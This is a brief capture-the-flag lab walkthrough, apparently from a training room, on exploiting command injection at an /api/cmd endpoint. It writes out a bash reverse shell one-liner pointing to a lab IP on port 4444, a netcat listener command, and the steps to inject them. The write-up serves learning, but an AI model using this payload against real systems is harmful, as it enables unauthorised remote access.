# Command injection 
-----

--> i found this at `http://<ip>:3000` 

![[Pasted image 20210813123146.png]]

--> but McSkidy found some input at `/api/cmd` directory 

--> so Let's go there and try to do command injection 

--> but we are getting this error 

![[Pasted image 20210813123302.png]]

--> but when i tried to do like `/api/cmd/ls` then i got the output !

![[Pasted image 20210813123345.png]]

--> so Let's get the reverse shell from this url 

--> we have this reverse shell 

`sh -i >& /dev/tcp/10.9.3.121/4444 0>&1`

--> but first we have to URL encode it and after that we will start our listner on port 4444

`nc -lvnp 4444`

--> and we got the shell after injecting this payload !

![[Pasted image 20210813123537.png]]

--> and i found `user.txt` in `home` directory 

![[Pasted image 20210813123618.png]]

------